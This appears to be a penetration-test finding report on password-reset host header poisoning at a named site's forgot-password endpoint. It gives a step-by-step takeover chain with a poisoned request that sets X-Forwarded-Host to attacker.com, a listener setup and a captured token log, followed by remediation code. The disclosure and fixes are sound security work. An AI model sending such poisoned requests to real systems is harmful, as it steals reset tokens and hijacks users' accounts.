🟠 Password Reset Host Header Poisoning — premiumalts.to

AUTHORIZED SECURITY RESEARCH ONLY. This report documents findings discovered during a contracted penetration test. All tests were performed under explicit written authorization using test accounts only. No production user data or credentials were retained.
HIGH CWE-640: Weak Password Recovery F-160 — Session 14 OOB Confirmed — 2026-04-24

Summary

The POST /api/auth/forgot-password endpoint on backend.premiumalts.to uses the X-Forwarded-Host and X-Host HTTP headers to construct the password-reset link included in the reset email. An attacker who knows a victim's email address can poison the reset link to point to an attacker-controlled domain. When the victim clicks the link, the attacker's server receives the one-time reset token and can use it to take over the account.

Attack Flow

[Attacker] Knows victim email: victim@example.com | ▼ POST /api/auth/forgot-password | X-Forwarded-Host: attacker.com | Body: {"email": "victim@example.com"} | [Server] Constructs reset link using X-Forwarded-Host: | → https://attacker.com/reset-password?token=REAL_TOKEN | Sends email to victim@example.com | [Victim] Receives: "Click here to reset your password" | https://attacker.com/reset-password?token=REAL_TOKEN | [Attacker] Receives HTTP request: | GET /reset-password?token=REAL_TOKEN ← TOKEN STOLEN | ▼ POST /api/auth/reset-password Body: {"token": "REAL_TOKEN", "newPassword": "attacker_chosen"} → Account taken over

Attack Chain (Step by Step)

1

Attacker sets up listener. Start an HTTP server (Interactsh, ngrok, netcat) at attacker.com to capture incoming HTTP requests.

2

Send poisoned forgot-password request. Target any registered email address on premiumalts.to:

POST https://backend.premiumalts.to/api/auth/forgot-password
Content-Type: application/json
X-Forwarded-Host: attacker.com

{"email": "victim@example.com"}
3

Server dispatches poisoned email. HTTP 200 received — the server constructs the reset link using the attacker-supplied host and sends it to the victim.

4

Victim clicks link. The reset email appears legitimate (from noreply@premiumalts.to, styled like the real site). The link URL contains the attacker's domain but the victim may not notice.

5

Attacker captures token. The attacker's HTTP server logs: 

GET /reset-password?token=abc123xyz789 HTTP/1.1
Host: attacker.com
The real one-time token is now in attacker's hands.

6

Account takeover. Attacker submits the stolen token with a new password — victim's account is fully compromised.

Remediation

Option A — application.properties (Spring Boot) — RECOMMENDED

# application.properties
server.forward-headers-strategy=NONE

# Never trust X-Forwarded-* headers unless behind a known proxy
# Use FRAMEWORK only if behind a trusted, controlled reverse proxy

Option B — Hardcode APP_URL in reset link builder

// PasswordResetService.java — BEFORE (vulnerable)
String resetUrl = request.getHeader("X-Forwarded-Host") + "/reset?token=" + token;

// AFTER (fixed)
String appUrl = environment.getProperty("APP_URL");  // e.g. "https://premiumalts.to"
String resetUrl = appUrl + "/reset?token=" + token;

Option C — Strip headers at nginx (defence in depth)

# nginx.conf
location / {
    proxy_set_header X-Forwarded-Host "";
    proxy_set_header X-Host "";
    proxy_set_header X-Original-URL "";
    proxy_set_header X-Rewrite-URL "";
    proxy_pass http://backend;
}
